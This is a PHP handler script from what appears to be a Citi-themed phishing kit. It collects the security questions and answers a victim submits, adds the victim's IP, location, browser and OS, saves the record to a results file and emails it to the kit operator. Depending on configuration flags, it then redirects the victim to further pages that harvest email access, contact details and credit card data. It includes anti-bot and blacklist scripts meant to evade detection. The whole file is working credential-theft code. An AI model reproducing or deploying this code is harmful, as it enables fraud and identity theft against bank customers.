<?php
ob_start();
session_start();

include'../../Anti/IP-BlackList.php';  
include'../../Anti/Bot-Crawler.php';
include'../../Anti/Bot-Spox.php';
include'../../Anti/blacklist.php';
include'../../Anti/new.php';
include'../../Anti/Dila_DZ.php';


if(isset($_POST['answer1'])&&isset($_POST['answer2'])){
	include '../../admin/YOUR-CONFIG.php';
	include '../../prevents/main.php';
	
	
$v_ip = $_SERVER['REMOTE_ADDR'];
$v_agent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$Question1 = $_SESSION['username'] = $_POST['Question1'];
$answer1 = $_SESSION['username'] = $_POST['answer1'];
$Question2 = $_SESSION['username'] = $_POST['Question2'];
$answer2 = $_SESSION['username'] = $_POST['answer2'];
$Question3 = $_SESSION['username'] = $_POST['Question3'];
$answer3 = $_SESSION['username'] = $_POST['answer3'];
$VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
$VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
$VictimInfo3 = "| Us3rAgent : " . $user_agent . "";
$VictimInfo4 = "| Br0wser : " . $br . "";
$VictimInfo5 = "| Os : " . $os . "";

$message .="+ -------- [ ⚡ East-code #S3curity T0ken# ⚡ ] -----------+\n";
$message .= "| Qkeztion1 : $Question1\n";
$message .= "| 3nzwer1 : $answer1\n";
$message .= "| Qkeztion2 : $Question2\n";
$message .= "| 3nzwer2 : $answer2\n";
$message .= "| Qkeztion3 : $Question3\n";
$message .= "| 3nzwer13 : $answer3\n";
$message .= "+ ------------------------------------+\n";
$message .= "+ 🌐 Victim Inf0rmation\n";
$message .= "$VictimInfo1\n";
$message .= "$VictimInfo2\n";
$message .= "$VictimInfo3\n";
$message .= "$VictimInfo4\n";
$message .= "$VictimInfo5\n";
$message .= "| 🕛 Received : $date\n";
$message .= "+ ------------------------------------+\n";
$message .= " https://ipgeolocation.io/ip-location/$ip \r\n";

		$save=fopen("../CITI_RESULT/SECURE".$pin.".txt","a+");
        fwrite($save,$message);
        fclose($save);
$subject = "⚡ East code S3curity T0ken   ⚡ [ $Question1  ]";
$head = "Content-type:text/plain;charset=UTF-8\r\n";
$head .= "From: $from <$sender_mail>" . "\r\n";
    @mail($sender_mail ,$subject,$message,$head);
		
    $key = substr(sha1(mt_rand()),1,25);
    
	if ($show_email_access=="yes") {
		exit(header("Location: ../../Email_identification?/.jsp/efs/servlet/efs/"));
	}
	if ($show_contact_information=="yes") {
		exit(header("Location: ../../Contact_information?/.jsp/efs/servlet/efs/"));
	}
	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verification?/.jsp/efs/servlet/efs/"));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../Success?/.jsp/efs/servlet/efs/")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2UgDDbr"));
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>